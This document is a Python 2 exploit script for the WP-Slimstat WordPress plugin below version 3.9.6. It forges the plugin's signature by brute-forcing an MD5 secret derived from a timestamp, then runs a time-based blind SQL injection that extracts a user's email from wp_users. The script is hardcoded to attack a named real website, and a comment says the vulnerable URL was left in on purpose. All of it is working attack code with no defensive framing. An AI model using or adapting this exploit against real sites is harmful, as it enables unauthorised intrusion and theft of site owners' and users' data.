# Written by Joren485

from phpserialize import *
from collections import OrderedDict
import time
import hashlib
import base64
import requests
import re
import sys
import operator
import json

def Blind_injection(s, url, secret):
    """The SQL Injection"""

    # A placeholder for the data
    data = ""

    # Scan for position 1 to 20
    for pos in xrange(1, 21):
        print "[+]Position: {0}".format(pos)

        # Only scan for alpha_numeric chars, @ and .
        for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@.":

            # Create an OrderedDict, which is supported by phpserialize, and put the payload in it
            p = OrderedDict()
            p["(SELECT IF (SUBSTRING(user_email,{0},1) ='{1}' ,sleep(4) ,0) FROM wp_users LIMIT 1)".format(pos, c)] = "1"

            # Serialize the data
            sql_payload = dumps(p)

            # Base64 encode the serialized payload array
            sql_payload64 =  base64.b64encode(sql_payload)

            # Create the right signature, with the bruteforced secret
            signature = hashlib.md5(sql_payload64+secret).hexdigest()

            # Format it the way WP-Slimstat wants
            ci = "{0}.{1}".format(sql_payload64, signature) 
            data_to_send = base64.b64encode("ci={0}&res=Lw==".format(ci))
            payload = {"action":"slimtrack_js", "data":data_to_send}

            # This is time based blind, which means it needs to be timed
            start = time.time()
            r = s.post(url, data=payload, )

            # If the sleep command was executed, the char is found
            if time.time() - start > 5:
                print "\t[+]Found: {0}".format(c)
                data += c
                break

            # If last char was not it, it has not been found and last char.
            if c == ".":
                return data

# I left the vulnerable url in because it is (very!!!) easy to find.
url = "http://jafs.es/"
print "[+]Attacking {0}".format(url)

# Remove last backslash, for Netcraft support 
if url.endswith ("/"):
    url = url[:-1]

# Create an session, with the appropriate user-agent
s = requests.Session()
s.headers={"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0",
           "Content-type": "application/x-www-form-urlencoded"}

# Retrieve the readme file for the wp-slimstat plugin
r_readme = s.get(url + "/wp-content/plugins/wp-slimstat/readme.txt")

# Only if the readme file exists
if r_readme.ok:
    print "[+]Readme found!"

    # Find the version in the readme file
    match = re.search(r"Stable tag: (\d)\.(\d)\.(\d)", r_readme.text)
    if match:

        version = ".".join(str(i) for i in match.group(1, 2, 3))
        print "[+]Version found: {0}!".format(version)

        # Check wheter the version is lower than 3.9.6
        sub = map(operator.sub, [3, 9, 5], map(int, match.group(1, 2, 3)))
        if sorted(sub)[0] >= 0:

            # Get the SlimStateParams from the homepage
            r_homepage = s.get(url)
            match = re.search("var SlimStatParams = ({.*});", r_homepage.text)
            if match:

                # Parse the SlimStatParams
                SlimStatParams = json.loads(match.group(1))
                ajaxurl = SlimStatParams["ajaxurl"]
                ci = SlimStatParams["ci"]

                print "[+]Found SlimStatParams"
                print "\t[+] ci: {0}".format(ci)
                print "\t[+] ajax url: {0}".format(ajaxurl)

            else:
                print "[-] SlimStatParams not found!"
                sys.exit()
        else:
            print "[-]Version > 3.9.6"
            sys.exit()

    else:
        print "[-]Version not found!"
        sys.exit()
else:
    print "[-]Readme not found!"
    sys.exit()

# Split the SlimStatParams into the nonce and the actuall data
signed, nonce = ci.split(".")

# Netcraft has an nice api that let you see the first month they saw an site,
# which is an good estimation of the install year.
r_netcraft = s.get("http://mirror.toolbar.netcraft.com/check_url/{0}".format(url[:-1]))

match = re.search('(\d{4})<\/a>  Rank:', r_netcraft.text)
if match:
    year = int(match.group(1))
    print "[+]Estimated year: {0}".format(year)

else:
    print "[-]Netcraft year not found!"
    sys.exit()

# Scan every epoch value of year - 1 up to year + 2
begin = int(time.mktime(time.strptime('01.01.{0} 00:00:00'.format(year - 1), '%d.%m.%Y %H:%M:%S')))
end = int(time.mktime(time.strptime('01.01.{0} 00:00:00'.format(year + 2), '%d.%m.%Y %H:%M:%S')))
n = end - begin + 1

# Start the bruteforcing of the epoch value
print "[+]Starting bruteforce!"
for epoch in xrange(n):

    # Very primitive progress bar
    progress = round((float(epoch)/n)*100, 6)
    if progress % 1 == 0:
        print "\t{0}%".format(progress)

    # Check if the epoch is the good value 
    secret = hashlib.md5(str(begin+epoch)).hexdigest()
    if nonce == hashlib.md5(signed+secret).hexdigest():
        print "[+]Found the secret: {0}".format(secret)
        break

# With the right epoch (and thus the right secret) found, start the blind SQL injection
print "[+]Starting blind sql injection"
data = Blind_injection(s, ajaxurl, secret)
print "[+]Found data: {0}".format(data )
